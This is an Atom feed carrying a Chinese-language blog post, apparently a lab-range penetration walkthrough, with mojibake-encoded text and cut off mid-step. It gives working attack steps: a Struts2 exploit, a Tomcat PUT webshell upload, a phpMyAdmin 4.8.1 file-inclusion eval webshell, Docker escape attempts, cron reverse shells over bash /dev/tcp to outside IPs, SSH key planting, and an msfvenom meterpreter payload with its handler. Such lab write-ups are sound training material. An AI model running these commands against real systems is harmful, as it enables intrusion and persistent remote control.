<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>http://blog.m1n.me</id>
    <title>M1N&#39;s Blog</title>
    <link href="http://blog.m1n.me" />
    <updated>2021-09-20T15:49:36.000Z</updated>
    <entry>
        <id>http://blog.m1n.me/2021/09/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B%E7%AC%94%E8%AE%B0/</id>
        <title>çº¢æ—¥é¶åœº(å››)ç¬”è®°</title>
        <link rel="alternate" href="http://blog.m1n.me/2021/09/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B%E7%AC%94%E8%AE%B0/"/>
        <content type="html">&lt;h1 id=&#34;çº¢æ—¥é¶åœº-å››-ç¬”è®°&#34;&gt;&lt;a href=&#34;#çº¢æ—¥é¶åœº-å››-ç¬”è®°&#34; class=&#34;headerlink&#34; title=&#34;çº¢æ—¥é¶åœº(å››)ç¬”è®°&#34;&gt;&lt;/a&gt;çº¢æ—¥é¶åœº(å››)ç¬”è®°&lt;/h1&gt;&lt;h2 id=&#34;å¤–ç½‘æ‰“ç‚¹&#34;&gt;&lt;a href=&#34;#å¤–ç½‘æ‰“ç‚¹&#34; class=&#34;headerlink&#34; title=&#34;å¤–ç½‘æ‰“ç‚¹&#34;&gt;&lt;/a&gt;å¤–ç½‘æ‰“ç‚¹&lt;/h2&gt;&lt;h3 id=&#34;2001ç«¯å£Struct2&#34;&gt;&lt;a href=&#34;#2001ç«¯å£Struct2&#34; class=&#34;headerlink&#34; title=&#34;2001ç«¯å£Struct2&#34;&gt;&lt;/a&gt;2001ç«¯å£Struct2&lt;/h3&gt;&lt;p&gt;BurpæŠ“åŒ…çœ‹åˆ°Struct2å­—æ ·ï¼Œç›´æ¥å·¥å…·æµ‹è¯•ä¸€æŠŠæ¢­&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170347.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170720.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;2002ç«¯å£Tomcat&#34;&gt;&lt;a href=&#34;#2002ç«¯å£Tomcat&#34; class=&#34;headerlink&#34; title=&#34;2002ç«¯å£Tomcat&#34;&gt;&lt;/a&gt;2002ç«¯å£Tomcat&lt;/h3&gt;&lt;p&gt;å¯ä»¥å‚è€ƒ&lt;a href=&#34;https://www.freebuf.com/articles/web/271892.html&#34;&gt;https://www.freebuf.com/articles/web/271892.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨PUTä¸Šä¼ å†°èé©¬ï¼Œæ³¨æ„ç›´æ¥ä¸Šä¼ &lt;code&gt;/shell.jsp&lt;/code&gt;ä¸è¡Œå“¦&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815180101.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;2003ç«¯å£phpMyAdmin-4-8-1&#34;&gt;&lt;a href=&#34;#2003ç«¯å£phpMyAdmin-4-8-1&#34; class=&#34;headerlink&#34; title=&#34;2003ç«¯å£phpMyAdmin 4.8.1&#34;&gt;&lt;/a&gt;2003ç«¯å£phpMyAdmin 4.8.1&lt;/h3&gt;&lt;p&gt;å¯ä»¥å‚è€ƒ&lt;a href=&#34;https://www.dazhuanlan.com/oliiiflorrr/topics/1144804&#34;&gt;https://www.dazhuanlan.com/oliiiflorrr/topics/1144804&lt;/a&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;éªŒè¯æ¼æ´æ˜¯å¦å­˜åœ¨&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815181519.png&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;ä½¿ç”¨SELECTè¯­å¥ååŒ…å«sessionæ–‡ä»¶æ¥get shellï¼Œå†™shell&lt;code&gt;SELECT &amp;quot;&amp;lt;?php phpinfo();file_put_contents(&amp;#39;m1n.php&amp;#39;, &amp;#39;&amp;lt;?=@eval($_POST[1]);&amp;#39;);?&amp;gt;&amp;quot;  &lt;/code&gt;ï¼Œè®¿é—®å‘ç°&lt;code&gt;http://10.0.5.100:2003/index.php?target=db_sql.php?/../../../../../../../../../tmp/sess_a851fdf11a88214580de888e61ed1867&lt;/code&gt;å‡ºç°phpinfoï¼Œç”¨èšå‰‘è¿æ¥m1n.phpå³å¯ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;Dockeré€ƒé€¸ï¼ˆ2002ç«¯å£çš„Tomcatï¼‰&#34;&gt;&lt;a href=&#34;#Dockeré€ƒé€¸ï¼ˆ2002ç«¯å£çš„Tomcatï¼‰&#34; class=&#34;headerlink&#34; title=&#34;Dockeré€ƒé€¸ï¼ˆ2002ç«¯å£çš„Tomcatï¼‰&#34;&gt;&lt;/a&gt;Dockeré€ƒé€¸ï¼ˆ2002ç«¯å£çš„Tomcatï¼‰&lt;/h2&gt;&lt;h3 id=&#34;å¦‚ä½•åˆ¤æ–­æ˜¯å¦åœ¨Dockeré‡Œ&#34;&gt;&lt;a href=&#34;#å¦‚ä½•åˆ¤æ–­æ˜¯å¦åœ¨Dockeré‡Œ&#34; class=&#34;headerlink&#34; title=&#34;å¦‚ä½•åˆ¤æ–­æ˜¯å¦åœ¨Dockeré‡Œ&#34;&gt;&lt;/a&gt;å¦‚ä½•åˆ¤æ–­æ˜¯å¦åœ¨Dockeré‡Œ&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;æ£€æŸ¥ &lt;code&gt;/.dockerenv&lt;/code&gt; æ–‡ä»¶æ˜¯å¦å­˜åœ¨&lt;/li&gt;
&lt;li&gt;æ£€æŸ¥ &lt;code&gt;/proc/1/cgroup&lt;/code&gt; å†…æ˜¯å¦åŒ…å« Docker ç­‰å­—ç¬¦ä¸²&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;å°è¯•DirtyCowæ¼æ´é€ƒé€¸&#34;&gt;&lt;a href=&#34;#å°è¯•DirtyCowæ¼æ´é€ƒé€¸&#34; class=&#34;headerlink&#34; title=&#34;å°è¯•DirtyCowæ¼æ´é€ƒé€¸&#34;&gt;&lt;/a&gt;å°è¯•DirtyCowæ¼æ´é€ƒé€¸&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;ä¸‹è½½POCï¼š&lt;a href=&#34;https://github.com/scumjr/dirtycow-vdso&#34;&gt;https://github.com/scumjr/dirtycow-vdso&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;ç¼–è¯‘ï¼Œä¸Šä¼ ï¼Œç›‘å¬ï¼Œè¿è¡Œï¼Œæ²¡ååº”ï¼Œä¸‹ä¸€ä¸ªã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;git clone https:&lt;span class=&#34;hljs-regexp&#34;&gt;//gi&lt;/span&gt;thub.com&lt;span class=&#34;hljs-regexp&#34;&gt;/scumjr/&lt;/span&gt;dirtycow-vdso.git&lt;br&gt;cd dirtycow-vdso&lt;br&gt;make&lt;br&gt;./&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xdeadbeef ip:port&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;å°è¯•runCå®¹å™¨é€ƒé€¸æ¼æ´ï¼ˆCVE-2019-5736ï¼‰&#34;&gt;&lt;a href=&#34;#å°è¯•runCå®¹å™¨é€ƒé€¸æ¼æ´ï¼ˆCVE-2019-5736ï¼‰&#34; class=&#34;headerlink&#34; title=&#34;å°è¯•runCå®¹å™¨é€ƒé€¸æ¼æ´ï¼ˆCVE-2019-5736ï¼‰&#34;&gt;&lt;/a&gt;å°è¯•runCå®¹å™¨é€ƒé€¸æ¼æ´ï¼ˆCVE-2019-5736ï¼‰&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;ä¸‹è½½POCï¼š&lt;a href=&#34;https://github.com/Frichetten/CVE-2019-5736-PoC&#34;&gt;https://github.com/Frichetten/CVE-2019-5736-PoC&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;æ”¹POCï¼ŒæŠŠpayloadé‚£è¡Œæ”¹æˆè‡ªå·±VPSçš„IP&lt;/li&gt;
&lt;li&gt;ç¼–è¯‘ï¼ˆå»ºè®®Linuxç¯å¢ƒä¸‹ï¼‰&lt;code&gt;CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;ä¸Šä¼ æ–‡ä»¶ï¼Œç›‘å¬ç«¯å£ï¼Œæ‰§è¡Œï¼Œæ²¡ååº”ï¼Œä¸‹ä¸€ä¸ªã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;å°è¯•ç‰¹æƒæ¨¡å¼é€ƒé€¸&#34;&gt;&lt;a href=&#34;#å°è¯•ç‰¹æƒæ¨¡å¼é€ƒé€¸&#34; class=&#34;headerlink&#34; title=&#34;å°è¯•ç‰¹æƒæ¨¡å¼é€ƒé€¸&#34;&gt;&lt;/a&gt;å°è¯•ç‰¹æƒæ¨¡å¼é€ƒé€¸&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;code&gt;fdisk -l&lt;/code&gt;æŸ¥çœ‹ç£ç›˜&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210816152320.png&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;p&gt;åœ¨æ ¹ç›®å½•ä¸‹åˆ›å»ºæ–‡ä»¶å¤¹ï¼ŒæŠŠ/dev/sda1æŒ‚åœ¨åˆ°è¯¥æ–‡ä»¶å¤¹&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;mkdir&lt;/span&gt; /m&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;n&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;mount&lt;/span&gt; /dev/sda&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; /m&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;n&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;å¯ä»¥çœ‹åˆ°å®¿ä¸»æœºçš„æ–‡ä»¶éƒ½åˆ°äº†/m1nç›®å½•ä¸‹&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;C:\Users\M1N\AppData\Roaming\Typora\typora-user-images\image-20210816152534150.png&#34; alt=&#34;image-20210816152534150&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;å°è¯•å†™å®šæ—¶ä»»åŠ¡æ¥åå¼¹shell&#34;&gt;&lt;a href=&#34;#å°è¯•å†™å®šæ—¶ä»»åŠ¡æ¥åå¼¹shell&#34; class=&#34;headerlink&#34; title=&#34;å°è¯•å†™å®šæ—¶ä»»åŠ¡æ¥åå¼¹shell&#34;&gt;&lt;/a&gt;å°è¯•å†™å®šæ—¶ä»»åŠ¡æ¥åå¼¹shell&lt;/h4&gt;&lt;p&gt;å‚è€ƒï¼š&lt;a href=&#34;https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/&#34;&gt;https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/&lt;/a&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å†™æ–‡ä»¶åˆ°&lt;code&gt;/var/spool/cron/crontabs/root&lt;/code&gt;ï¼Œæ³¨æ„å†™åˆ°&lt;code&gt;/var/spool/cron/root&lt;/code&gt;ä¸è¡Œå—·&lt;/li&gt;
&lt;li&gt;åŒæ—¶æ³¨æ„rootæ–‡ä»¶çš„æƒé™å¿…é¡»ä¸º600&lt;/li&gt;
&lt;li&gt;æ³¨æ„å®šæ—¶ä»»åŠ¡æ–‡ä»¶å†…å®¹ä¸­ï¼Œè·¯å¾„è¦ç”¨ç»å¯¹è·¯å¾„ï¼Œå»ºè®®æŠŠå‘½ä»¤å†™æˆ&lt;code&gt;.sh&lt;/code&gt;æ–‡ä»¶ï¼Œç„¶å&lt;code&gt;chmod +x&lt;/code&gt;ï¼Œç„¶åè°ƒç”¨ï¼Œä¸å®¹æ˜“å‡ºé”™&lt;/li&gt;
&lt;li&gt;ä¹Ÿå¯ä»¥&lt;code&gt;*/1 * * * *  bash -c &amp;quot;bash -i  &amp;gt;&amp;amp;/dev/tcp/123.207.x.x/1234 0&amp;gt;&amp;amp;1&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;åœ¨æœ¬åœ°çš„Ubuntu20è™šæ‹Ÿæœºä¸­æˆåŠŸåå¼¹shellï¼Œä½†æ˜¯é¶åœºç¯å¢ƒä¸‹æ²¡æ³•æˆåŠŸï¼Œå†™å…¥äº†å®šæ—¶ä»»åŠ¡å¿…é¡»restartæ‰å¯ä»¥æ‰§è¡Œï¼Œå¦åˆ™ä¸æ‰§è¡Œï¼Œæ— å¥ˆã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;å®šæ—¶ä»»åŠ¡ç›¸å…³ç¬”è®°ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;å®šæ—¶ä»»åŠ¡æœ‰æ—¶æ— æ³•çœ‹åˆ°æŠ¥é”™ä¿¡æ¯ï¼Œå¯ä»¥è¿™æ ·è·å–æŠ¥é”™ä¿¡æ¯&lt;/p&gt;
&lt;p&gt;&lt;code&gt;\* * * * * &amp;#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.0.106/7777 0&amp;gt;&amp;amp;1&amp;#39;&amp;gt;/tmp/error.txt 2&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;å®šæ—¶ä»»åŠ¡æŸ¥çœ‹æ—¥å¿—ï¼š&lt;a href=&#34;https://www.cnblogs.com/zhangshengxiang/p/11842326.html&#34;&gt;https://www.cnblogs.com/zhangshengxiang/p/11842326.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ï¼ˆ1ï¼‰æŸ¥çœ‹ç³»ç»Ÿæ—¥å¿—ç›´æ¥ï¼š&lt;code&gt;tail -f /var/log/syslog&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;ï¼ˆ2ï¼‰æŸ¥çœ‹crontabæ—¥å¿—ï¼š&lt;/p&gt;
&lt;p&gt;â€‹    æ–¹æ³•1&lt;/p&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;. ä¿®æ”¹rsyslogæ–‡ä»¶ï¼Œå°†&lt;span class=&#34;hljs-regexp&#34;&gt;/etc/&lt;/span&gt;rsyslog.d/&lt;span class=&#34;hljs-number&#34;&gt;50&lt;/span&gt;-default.conf æ–‡ä»¶ä¸­çš„&lt;span class=&#34;hljs-comment&#34;&gt;#cron.*å‰çš„#åˆ æ‰ï¼›&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;. é‡å¯rsyslogæœåŠ¡service rsyslog restart&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;. é‡å¯cronæœåŠ¡service cron restart&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;â€‹    æ–¹æ³•2&lt;/p&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;. ç¼–è¾‘ &lt;span class=&#34;hljs-regexp&#34;&gt;/etc/&lt;/span&gt;syslog.confï¼Œå¹¶ä¸”æ‰“å¼€ä»¥cron.*å¼€å§‹çš„é‚£è¡Œæ³¨é‡Šã€‚&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;. è¿è¡Œ &lt;span class=&#34;hljs-regexp&#34;&gt;/etc/i&lt;/span&gt;nit.d/sysklogd restart&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;. è¿è¡Œ &lt;span class=&#34;hljs-regexp&#34;&gt;/etc/i&lt;/span&gt;nit.d/cron restart&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;â€‹    æŸ¥çœ‹cronæ—¥å¿—&lt;/p&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;. linux&lt;br&gt;çœ‹ &lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;log&lt;span class=&#34;hljs-regexp&#34;&gt;/cronè¿™ä¸ªæ–‡ä»¶å°±å¯ä»¥ï¼Œå¯ä»¥ç”¨tail -f /&lt;/span&gt;var&lt;span class=&#34;hljs-regexp&#34;&gt;/log/&lt;/span&gt;cronè§‚å¯Ÿï¼ˆæˆ–è€…&lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;log/cron.logï¼‰&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;. unix&lt;br&gt;åœ¨ &lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;spool&lt;span class=&#34;hljs-regexp&#34;&gt;/cron/&lt;/span&gt;tmpæ–‡ä»¶ä¸­ï¼Œæœ‰croutXXX001864çš„tmpæ–‡ä»¶ï¼Œtail è¿™äº›æ–‡ä»¶å°±å¯ä»¥çœ‹åˆ°æ­£åœ¨æ‰§è¡Œçš„ä»»åŠ¡äº†ã€‚&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;. mailä»»åŠ¡&lt;br&gt;åœ¨ &lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;spool&lt;span class=&#34;hljs-regexp&#34;&gt;/mail/&lt;/span&gt;root æ–‡ä»¶ä¸­ï¼Œæœ‰crontabæ‰§è¡Œæ—¥å¿—çš„è®°å½•ï¼Œç”¨tail -f &lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;spool&lt;span class=&#34;hljs-regexp&#34;&gt;/mail/&lt;/span&gt;root å³å¯æŸ¥çœ‹æœ€è¿‘çš„crontabæ‰§è¡Œæƒ…å†µ&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;å°è¯•å†™-sshå…¬é’¥æ¥è¿æ¥&#34;&gt;&lt;a href=&#34;#å°è¯•å†™-sshå…¬é’¥æ¥è¿æ¥&#34; class=&#34;headerlink&#34; title=&#34;å°è¯•å†™.sshå…¬é’¥æ¥è¿æ¥&#34;&gt;&lt;/a&gt;å°è¯•å†™.sshå…¬é’¥æ¥è¿æ¥&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;æœ¬åœ°ç”Ÿæˆå…¬ç§é’¥&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;ssh&lt;/span&gt;-keygen -f m&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;n&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;chmod&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;600&lt;/span&gt; m&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;n&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;æŠŠm1n.pubæ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„&lt;code&gt;/root/.ssh/&lt;/code&gt;ç›®å½•ä¸‹ï¼ˆæ³¨æ„ï¼Œæ˜¯/m1nä¸‹çš„/root/.sshï¼‰ï¼Œæ²¡æœ‰è¿™ä¸ªç›®å½•å°±åˆ›å»ºè¿™ä¸ªç›®å½•&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;æŠŠm1n.pubçš„æ–‡ä»¶å†…å®¹å†™åˆ°authorized_keysæ–‡ä»¶ä¸­&lt;code&gt;cat m1n.pub &amp;gt; authorized_keys&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ç„¶å&lt;code&gt;ssh -i m1n root@ip&lt;/code&gt;è¿æ¥ï¼Œå³å¯&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210816161055.png&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;è¸©å‘ç¬”è®°ï¼šä¸è¦å†™å…¬é’¥åˆ°&lt;code&gt;/home/ubuntu/.ssh/&lt;/code&gt;ç›®å½•ä¸‹ï¼Œè¿ä¸ä¸Šã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;å†…ç½‘æ¸—é€&#34;&gt;&lt;a href=&#34;#å†…ç½‘æ¸—é€&#34; class=&#34;headerlink&#34; title=&#34;å†…ç½‘æ¸—é€&#34;&gt;&lt;/a&gt;å†…ç½‘æ¸—é€&lt;/h2&gt;&lt;h3 id=&#34;ä¼ ğŸ&#34;&gt;&lt;a href=&#34;#ä¼ ğŸ&#34; class=&#34;headerlink&#34; title=&#34;ä¼ ğŸ&#34;&gt;&lt;/a&gt;ä¼ ğŸ&lt;/h3&gt;&lt;h4 id=&#34;MSFğŸ&#34;&gt;&lt;a href=&#34;#MSFğŸ&#34; class=&#34;headerlink&#34; title=&#34;MSFğŸ&#34;&gt;&lt;/a&gt;MSFğŸ&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;ç”ŸæˆmsfğŸ&lt;/p&gt;
&lt;p&gt;&lt;code&gt;msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.192.168.145 LPORT=4444 -f elf &amp;gt; mshell.elf&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;æŠŠğŸå„¿ä¼ åˆ°ç›®æ ‡æœºå­ä¸Šé¢&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;æ”»å‡»æœºæ‰§è¡Œä»¥ä¸‹&lt;/p&gt;
&lt;figure class=&#34;highlight routeros&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs routeros&#34;&gt;use exploit/multi/handler&lt;br&gt;&lt;span class=&#34;hljs-builtin-name&#34;&gt;set&lt;/span&gt; payload linux/x64/meterpreter/reverse_tcp&lt;br&gt;&lt;span class=&#34;hljs-builtin-name&#34;&gt;set&lt;/span&gt; lhost 10.192.168.145&lt;br&gt;&lt;span class=&#34;hljs-builtin-name&#34;&gt;set&lt;/span&gt; lport 4444&lt;br&gt;run&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ç›®æ ‡æœºå™¨æ·»åŠ æƒé™åæ‰§è¡Œmshell.elf&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;kaliæ¥æ”¶åˆ°shell&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108261512059.png&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;&lt;p&gt;msfæ‹¿åˆ°shellåï¼Œéœ€è¦å¯¼å…¥è·¯ç”±ï¼Œä½¿ç”¨msf6çš„è‡ªåŠ¨è·¯ç”±å¯¼å…¥&lt;/p&gt;
